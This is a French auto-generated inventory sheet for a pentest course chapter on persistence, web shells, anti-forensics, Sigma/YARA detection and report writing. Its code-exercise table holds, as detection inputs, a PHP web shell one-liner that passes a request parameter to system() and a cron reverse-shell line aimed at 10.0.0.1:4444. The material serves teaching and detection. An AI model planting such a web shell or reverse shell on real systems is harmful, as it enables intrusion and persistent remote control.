# Chapitre 6 — Maintien de l'Accès, Post-Exploitation, Anti-Forensics & Rapport de Pentest

> Fiche extraite du fichier `b3-hacking/chapitres/chapitre6.html` (544 lignes, 40.0 Ko, sha256 `69becdd6c344`).
> Famille : **cours-b3-hacking** · sous-type : `chapitre` · statut : **servi-canonique**.
> Cette fiche decrit ce que le document contient reellement ; les elements deduits du JavaScript sont signales `[deduit]` et references au document thematique.

## 1. Identite et acces

| Champ | Valeur |
|---|---|
| URL servie | `/b3-hacking/chapitres/chapitre6.html` |
| Titre du document | Module 6 — Maintien de l'Accès, Post-Exploitation, Anti-Forensics & Rapport de Pentest \| Hacking Éthique & Pentest B3 |
| Description meta | Module 6 du cours Hacking Éthique & Pentest B3 : Mécanismes de persistance et maintien de l'accès (web shells obfusqués, tâches cron, services d'arrière-plan, clés SSH autorisées, clés de registre Run/RunOnce sous Windows), techniques de dissimulation et d'anti-forensics (timestomping, altération de journaux d'événements syslog et wevtutil), compréhension des contre-mesures défensives (SIEM, EDR, règles Sigma et signatures YARA), méthodologie de rédaction du rapport de test d'intrusion professionnel, synthèse managériale (Executive Summary) et plan de remédiation priorisé. Notions clés, démonstrations, ateliers de code interactifs, QCM corrigés. |
| Robots | indexable (defaut) |
| Langue / theme | `fr` / `defaut` |
| Chapitre (body) | 6 |
| Regle d'acces | Compte connecte + niveau B3 ou superieur + abonnement actif |
| Statut de service | servi-canonique |

## 2. Structure du document (ordre observe)

| # | Element | Classe / role | Contenu cle |
|---|---|---|---|
| 1 | nav | skip-nav | 1 liens, aria="Accès rapide" |
| 2 | h1 | — | Chapitre 6 — Maintien de l'Accès, Post-Exploitation, Anti-Forensics & Rapport de Pentest |
| 3 | h2 | — | 1. Persistance & Maintien de l'Accès (Linux & Windows) |
| 4 | h2 | — | 2. Web Shells & Détection de l'Obfuscation |
| 5 | h2 | — | 3. Dissimulation, Anti-Forensics & Nettoyage d'Implants |
| 6 | h2 | — | 4. Détection Moderne de la Blue Team : SIEM, EDR, Sigma & YARA |
| 7 | h2 | — | 5. Structure Normalisée du Rapport de Test d'Intrusion Professionnel |
| 8 | h2 | — | 6. Études de cas & applications pratiques |
| 9 | h2 | — | 7. QCM — niveau examen |
| 10 | h2 | — | 8. Erreurs classiques — récapitulatif |
| 11 | h2 | — | 9. Méthodologie de résolution |
| 12 | h2 | — | 10. Révision active |
| 13 | h2 | — | 11. Test de maîtrise |
| 14 | .lab | code lab | 3 bloc(s) |
| 15 | .qcm | QCM | 8 question(s) |
| 16 | table | — | 1 tableau(x) |

## 3. Hierarchie des titres

- **H1** — Chapitre 6 — Maintien de l'Accès, Post-Exploitation, Anti-Forensics & Rapport de Pentest
  - **H2** — 1. Persistance & Maintien de l'Accès (Linux & Windows)
      - **H4** — Mécanismes de Persistance Linux
      - **H4** — Mécanismes de Persistance Windows
  - **H2** — 2. Web Shells & Détection de l'Obfuscation
      - **H4** — Anatomie d'un Web Shell PHP
      - **H4** — Techniques d'Obfuscation
  - **H2** — 3. Dissimulation, Anti-Forensics & Nettoyage d'Implants
      - **H4** — Timestomping (Horodatage)
      - **H4** — Gestion des Journaux d'Événements
      - **H4** — Protocole de Nettoyage (Cleanup)
  - **H2** — 4. Détection Moderne de la Blue Team : SIEM, EDR, Sigma & YARA
      - **H4** — Règles Sigma (Détection de Logs SIEM)
      - **H4** — Règles YARA (Détection de Fichiers & Binaires)
  - **H2** — 5. Structure Normalisée du Rapport de Test d'Intrusion Professionnel
  - **H2** — 6. Études de cas & applications pratiques
    - **H3** — Exercice 1 — Recherche illustrative de signatures textuelles
    - **H3** — Exercice 2 — Recherche de motifs de persistance Linux
    - **H3** — Exercice 3 — Générateur de Synthèse Managériale et Matrice de Risque de Pentest
  - **H2** — 7. QCM — niveau examen
  - **H2** — 8. Erreurs classiques — récapitulatif
  - **H2** — 9. Méthodologie de résolution
  - **H2** — 10. Révision active
    - **H3** — Checklist de maîtrise
    - **H3** — Les 8 notions à connaître absolument
  - **H2** — 11. Test de maîtrise

## 4. Navigation et liens

| Zone | Classe | Liens |
|---|---|---|
| nav | `skip-nav` | Aller au contenu → `#content` |
| nav | `b3-hackingnav` | Portail → `/`<br>Hacking Éthique & Pentest B3 → `../index.html`<br>Sommaire → `../sommaire.html`<br>Ch. 1 → `../chapitres/chapitre1.html`<br>Ch. 2 → `../chapitres/chapitre2.html`<br>Ch. 3 → `../chapitres/chapitre3.html`<br>Ch. 4 → `../chapitres/chapitre4.html`<br>Ch. 5 → `../chapitres/chapitre5.html`<br>Ch. 6 → `../chapitres/chapitre6.html`<br>Cartes → `../chapitres/cartes.html`<br>Mémo → `../chapitres/formules.html`<br>Exercices → `../chapitres/exercices.html`<br>Atelier → `../atelier.html`<br>Examen → `../chapitres/examens.html` |

Liens sortants : **21** (externes : 0).

| Libelle | href | Cible resolue | Type |
|---|---|---|---|
| Aller au contenu | `#content` | `#content` | ancre |
| Portail | `/` | `.` | interne |
| Hacking Éthique & Pentest B3 | `../index.html` | `b3-hacking/index.html` | interne |
| Sommaire | `../sommaire.html` | `b3-hacking/sommaire.html` | interne |
| Ch. 1 | `../chapitres/chapitre1.html` | `b3-hacking/chapitres/chapitre1.html` | interne |
| Ch. 2 | `../chapitres/chapitre2.html` | `b3-hacking/chapitres/chapitre2.html` | interne |
| Ch. 3 | `../chapitres/chapitre3.html` | `b3-hacking/chapitres/chapitre3.html` | interne |
| Ch. 4 | `../chapitres/chapitre4.html` | `b3-hacking/chapitres/chapitre4.html` | interne |
| Ch. 5 | `../chapitres/chapitre5.html` | `b3-hacking/chapitres/chapitre5.html` | interne |
| Ch. 6 | `../chapitres/chapitre6.html` | `b3-hacking/chapitres/chapitre6.html` | interne |
| Cartes | `../chapitres/cartes.html` | `b3-hacking/chapitres/cartes.html` | interne |
| Mémo | `../chapitres/formules.html` | `b3-hacking/chapitres/formules.html` | interne |
| Exercices | `../chapitres/exercices.html` | `b3-hacking/chapitres/exercices.html` | interne |
| Atelier | `../atelier.html` | `b3-hacking/atelier.html` | interne |
| Examen | `../chapitres/examens.html` | `b3-hacking/chapitres/examens.html` | interne |
| Réviser avec les flashcards | `cartes.html` | `b3-hacking/chapitres/cartes.html` | interne |
| Mémo syntaxe | `formules.html` | `b3-hacking/chapitres/formules.html` | interne |
| Atelier de code | `../atelier.html` | `b3-hacking/atelier.html` | interne |

## 5. Formulaires et champs

Aucun formulaire dans cette page.
## 6. Boutons et controles interactifs

| Libelle | type | id | classes | aria-label | Etat initial | data-* |
|---|---|---|---|---|---|---|
| (icone) | button | themeToggle | `theme-toggle` | Activer le mode sombre | actif | — |
| Vulgariser les résultats de l'audit et l'impact métier pour les décideurs et la direction |  | — | `opt` | — | actif | data-correct=1 |
| Copier-coller l'intégralité des sorties brutes des scans Nmap pour prouver le travail acco |  | — | `opt` | — | actif | — |
| Fournir des exploits prêts à l'emploi pour attaquer les concurrents |  | — | `opt` | — | actif | — |
| Remplacer le contrat de mandat en cas de litige judiciaire |  | — | `opt` | — | actif | — |
| L'ajout de sa clé publique dans le fichier ~/.ssh/authorized_keys |  | — | `opt` | — | actif | data-correct=1 |
| La modification du fichier /etc/resolv.conf |  | — | `opt` | — | actif | — |
| L'effacement du binaire /bin/bash |  | — | `opt` | — | actif | — |
| L'activation du protocole Telnet sur le port 23 |  | — | `opt` | — | actif | — |
| HKCU\Software\Microsoft\Windows\CurrentVersion\Run |  | — | `opt` | — | actif | data-correct=1 |
| HKLM\SYSTEM\CurrentControlSet\Services\Tcpip |  | — | `opt` | — | actif | — |
| HKCR\.txt |  | — | `opt` | — | actif | — |
| HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall |  | — | `opt` | — | actif | — |
| La modification volontaire des dates et heures de création/modification d'un fichier malve |  | — | `opt` | — | actif | data-correct=1 |
| L'accélération de l'horloge matérielle du processeur pour dépasser les quotas réseau |  | — | `opt` | — | actif | — |
| L'effacement physique des disques durs à l'aide d'un aimant |  | — | `opt` | — | actif | — |
| Le blocage des requêtes NTP sur le réseau local |  | — | `opt` | — | actif | — |
| Identifier et classifier des fichiers malveillants ou web shells en analysant la présence |  | — | `opt` | — | actif | data-correct=1 |
| Chiffrer les disques durs des serveurs de production |  | — | `opt` | — | actif | — |
| Créer des tunnels VPN entre deux datacenters distants |  | — | `opt` | — | actif | — |
| Générer des clés d'activation logicielles |  | — | `opt` | — | actif | — |
| Parce que le vidage d'un journal génère obligatoirement l'événement critique 1102 ("The au |  | — | `opt` | — | actif | data-correct=1 |
| Parce que cette commande réinitialise immédiatement le mot de passe du domaine |  | — | `opt` | — | actif | — |
| Parce que Windows refuse d'exécuter cette commande même avec des privilèges SYSTEM |  | — | `opt` | — | actif | — |
| Parce que cela supprime les fichiers système Windows et fait crasher l'ordinateur |  | — | `opt` | — | actif | — |
| Immédiat (moins de 24 à 48 heures) car elles sont simples à déployer et neutralisent les r |  | — | `opt` | — | actif | data-correct=1 |
| Dans 3 à 5 ans après renouvellement complet du parc informatique |  | — | `opt` | — | actif | — |
| Uniquement si le budget annuel de sécurité est excédentaire |  | — | `opt` | — | actif | — |
| Après avoir réécrit entièrement l'application en langage assembleur |  | — | `opt` | — | actif | — |
| Pour ne laisser aucune porte dérobée, compte de test ou binaire malveillant susceptible d' |  | — | `opt` | — | actif | data-correct=1 |
| … | | | | | | 3 de plus |

## 7. Composants pedagogiques et etats observes

| Exercice | Langage | Hauteur | Correction | Entree standard | Titre |
|---|---|---|---|---|---|
| `hk3-c6-e1` | analyse | 300 | active | `SCAN_SCRIPT code=<?php if(isset($_REQUEST["cmd"])){ system($_REQUEST["cmd"]); } ?>` | Exercice 1 — Recherche illustrative de signatures textuelles |
| `hk3-c6-e2` | analyse | 300 | active | `PERSIST_AUDIT type=CRON command=* * * * * /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1` | Exercice 2 — Recherche de motifs de persistance Linux |
| `hk3-c6-e3` | analyse | 300 | active | `PENTEST_SYNTHESIS findings=sqli_auth:CRITICAL,weak_cipher:MEDIUM,missing_hsts:LOW` | Exercice 3 — Générateur de Synthèse Managériale et Matrice de Risque de Pentest |

- QCM : 1 bloc(s), **8 question(s)**.
- Encadres pedagogiques : 6 (`.box`, variantes `box--*`).
- Blocs replies : 3 (`<details>`).

Etats et interactions a reconstruire :

- En-tete compact : fil d'Ariane, titre, meta (module, duree, statut gratuit).
- Encadres pedagogiques : mise en situation, objectifs, intuition, piege, methode, technique, revision.
- Tableaux de donnees et blocs pseudo-code defilables horizontalement.
- Exercices de code (`div.lab[data-lab]`) : editeur, entree standard, console a 3 onglets, tuteur IA.
- Correction suspendue si `data-grading-suspended="1"` : bouton « Validation suspendue » desactive et avis visible.
- QCM : options desactivees apres reponse, bonne reponse `is-correct`, mauvaise `is-wrong`, explication `is-shown`.
- Score QCM : `Score : n/N (p %)` + palier de maitrise (4 bandes).
- Checklist de maitrise : case `data-mark-done`, etat persiste en localStorage par chapitre.
- Navigation de bas de page : chapitre precedent / suivant.

## 8. Tableaux, code et medias

- Tableaux : 1 (0 lignes / 3 en-tetes)
- Blocs `pre` : 6 · elements `code` : 78
- SVG inline : 20 · images : 0
- Icones du sprite utilisees : `#i-house`, `#i-shield`, `#i-play`, `#i-target`, `#i-book`, `#i-lightbulb`, `#i-warning`, `#i-compass`, `#i-pin`, `#i-cards`, `#i-file`, `#i-chart`, `#i-arrow-left`, `#i-arrow-right`
- Volume de texte : ~3309 mots · 532 noeuds HTML

## 9. Ressources chargees

- Feuilles de style : `https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700;800&display=swap`, `/assets/css/tokens.css`, `../assets/css/cours.css`, `/assets/css/code-lab.css`, `/assets/vendor/katex/katex.min.css`
- Scripts externes : `/assets/js/theme.js`, `../assets/js/cours.js`, `/assets/vendor/katex/katex.min.js`, `/assets/vendor/katex/auto-render.min.js`, `/assets/js/code-lab.js`
- Blocs `<style>` inline : 0 · scripts inline : 4

## 10. Classes et attributs data observes

Classes distinctes : 68. Les plus frequentes :

| Classe | Occurrences |
|---|---|
| `opt` | 32 |
| `ic` | 18 |
| `card` | 9 |
| `q` | 8 |
| `q__stem` | 8 |
| `opts` | 8 |
| `q__exp` | 8 |
| `box` | 6 |
| `box__title` | 6 |
| `grid` | 4 |
| `btn` | 4 |
| `bandrow` | 4 |
| `tag` | 3 |
| `grid-2` | 3 |
| `lab` | 3 |
| `lab__head` | 3 |
| `lab__title` | 3 |
| `lab__meta` | 3 |
| `lab__lang` | 3 |
| `lab__formative` | 3 |

Attributs `data-*` : `data-correct` (8), `data-lab` (3), `data-exercise` (3), `data-language` (3), `data-height` (3), `data-stdin` (3), `data-lab-starter` (3), `data-chapter` (1), `data-mark-done` (1)

## 11. Controle qualite automatique

- Titres `h1` : 1
- Boutons sans texte ni aria-label : 0
- Champs identifies sans label associe : 0
- Images sans attribut alt : 0
- Liens sans texte ni aria-label : 0
- Emoji detectes : 0 (la charte du produit les proscrit)

## 12. Renvois

- Layouts et gabarits : [04_LAYOUTS_ET_STRUCTURES.md](../../../04_LAYOUTS_ET_STRUCTURES.md)
- Composants et etats : [05_COMPOSANTS_REUTILISABLES.md](../../../05_COMPOSANTS_REUTILISABLES.md) · [10_ETATS_INTERFACE.md](../../../10_ETATS_INTERFACE.md)
- Regles d'acces : [11_ETATS_CONDITIONNELS.md](../../../11_ETATS_CONDITIONNELS.md) · [17_REGLES_METIER.md](../../../17_REGLES_METIER.md)
- Captures a produire : [22_REGISTRE_CAPTURES.md](../../../22_REGISTRE_CAPTURES.md)

*Fiche generee le 2026-11-05 par `tools/extract.mjs` ; donnees brutes dans `evidence/pages.json`.
